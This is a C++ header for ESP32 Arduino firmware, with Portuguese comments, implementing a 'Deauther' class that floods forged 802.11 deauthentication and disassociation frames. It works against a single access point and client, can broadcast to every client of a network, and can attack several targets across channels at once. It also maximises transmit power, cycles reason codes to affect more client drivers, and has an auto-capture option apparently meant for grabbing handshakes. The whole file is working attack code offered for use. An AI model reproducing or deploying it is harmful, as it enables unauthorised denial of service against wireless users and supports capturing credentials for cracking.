#pragma once
#include <Arduino.h>
#include <esp_wifi.h>
#include <vector>
#include "../utils/logger.h"
#include "../config.h"

// Forward declaration para lockChannel sem include circular
class Sniffer;

class Deauther {
public:
    static Deauther& get() { static Deauther inst; return inst; }

    bool     running       = false;
    bool     autoCapture   = false;
    uint32_t framesSent    = 0;
    uint8_t  intensity     = 1;  // 0=suave, 1=normal, 2=agressivo

    // Alvo principal (single mode)
    uint8_t targetAP[6]     = {0};
    uint8_t targetClient[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint8_t channel         = 1;
    bool    broadcastMode   = true;

    // Multi-target mode
    struct Target {
        uint8_t ap[6];
        uint8_t client[6];
        uint8_t channel;
    };
    std::vector<Target> multiTargets;
    bool multiMode = false;

    // Chamado pelo main após sniffer estar disponível
    using LockChannelFn = void(*)(uint8_t ch);
    using ResumeHopFn   = void(*)();
    LockChannelFn fnLockChannel = nullptr;
    ResumeHopFn   fnResumeHop   = nullptr;

    void start(const uint8_t* ap, const uint8_t* client, uint8_t ch, bool autoC = false) {
        memcpy(targetAP, ap, 6);
        if (client) memcpy(targetClient, client, 6);
        else        memset(targetClient, 0xFF, 6);
        channel       = ch;
        broadcastMode = (client == nullptr || memcmp(client, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) == 0);
        autoCapture   = autoC;
        framesSent    = 0;
        multiMode     = false;
        running       = true;
        // Trava sniffer no canal do alvo para não interromper deauth
        if (fnLockChannel) fnLockChannel(ch);
        // Potência máxima (~20 dBm)
        esp_wifi_set_max_tx_power(84);
        LOG.warn("[DEAUTH] " + bssidStr(ap) +
                 (broadcastMode ? " -> BROADCAST" : " -> " + bssidStr(client)) +
                 " ch" + String(ch) + (autoC ? " [AUTO-CAPTURE]" : ""));
    }

    void startMulti(const std::vector<Target>& targets) {
        multiTargets = targets;
        multiMode    = true;
        framesSent   = 0;
        running      = true;
        esp_wifi_set_max_tx_power(84);
        LOG.warn("[DEAUTH MULTI] " + String(targets.size()) + " alvos simultâneos");
    }

    void addMultiTarget(const uint8_t* ap, const uint8_t* client, uint8_t ch) {
        Target t;
        memcpy(t.ap, ap, 6);
        memcpy(t.client, client, 6);
        t.channel = ch;
        multiTargets.push_back(t);
    }

    void stop() {
        running     = false;
        autoCapture = false;
        multiMode   = false;
        multiTargets.clear();
        if (fnResumeHop) fnResumeHop();
        esp_wifi_set_max_tx_power(78); // volta ao padrão ~19.5 dBm
        LOG.info("[DEAUTH] Parado. Frames enviados: " + String(framesSent));
    }

    void tick() {
        if (!running) return;
        if (multiMode) _tickMulti();
        else           _tickSingle();
    }

    static String bssidStr(const uint8_t* b) {
        char buf[18];
        snprintf(buf,18,"%02X:%02X:%02X:%02X:%02X:%02X",b[0],b[1],b[2],b[3],b[4],b[5]);
        return buf;
    }

private:
    static const uint8_t _reasons[];
    // Razões extras para cobrir mais drivers de clientes
    static const uint8_t _reasons2[];

    int _burstSize() const {
        if (intensity == 0) return DEAUTH_BURST_SOFT;
        if (intensity == 2) return DEAUTH_BURST_HARD;
        return DEAUTH_BURST;
    }

    void _tickSingle() {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        int burst = _burstSize();
        for (int i = 0; i < burst; i++) {
            uint8_t reason  = _reasons[i % 8];
            uint8_t reason2 = _reasons2[i % 8];
            // Deauth AP→Cliente e Cliente→AP
            _sendFrame(targetAP, targetClient, reason,  0xC0);
            _sendFrame(targetAP, targetClient, reason2, 0xA0); // disassoc
            // Broadcast independente do modo para desconectar todos
            if (!broadcastMode) {
                _sendFrame(targetAP, bcast, reason, 0xC0);
            }
            framesSent += broadcastMode ? 2 : 3;
        }
    }

    void _tickMulti() {
        if (multiTargets.empty()) return;
        int burst = _burstSize();
        // Ataca TODOS os alvos por tick (não apenas round-robin)
        for (auto& t : multiTargets) {
            esp_wifi_set_channel(t.channel, WIFI_SECOND_CHAN_NONE);
            // Burst dividido por canal mas mínimo 16
            int b = max(16, burst / (int)multiTargets.size());
            for (int i = 0; i < b; i++) {
                _sendFrame(t.ap, t.client, _reasons[i % 8],  0xC0);
                _sendFrame(t.ap, t.client, _reasons2[i % 8], 0xA0);
                framesSent += 2;
            }
        }
    }

    void _sendFrame(const uint8_t* ap, const uint8_t* client, uint8_t reason, uint8_t fc0) {
        uint8_t f[26] = {};
        f[0] = fc0; f[1] = 0x00;
        // Duration: 0x013A = 314µs (valor real para management frames)
        f[2] = 0x3A; f[3] = 0x01;
        f[24] = reason;
        // AP → Client: driver gerencia sequence number (en_sys_seq=true)
        memcpy(f + 4,  client, 6);
        memcpy(f + 10, ap, 6);
        memcpy(f + 16, ap, 6);
        esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true);
        // Client → AP
        memcpy(f + 4,  ap, 6);
        memcpy(f + 10, client, 6);
        memcpy(f + 16, ap, 6);
        esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true);
    }
};

inline const uint8_t Deauther::_reasons[] = {
    0x01, 0x02, 0x03, 0x04, 0x07, 0x08, 0x09, 0x0E
};

// Conjunto complementar de razões para disassoc/segundo round de deauth
inline const uint8_t Deauther::_reasons2[] = {
    0x05, 0x06, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14
};
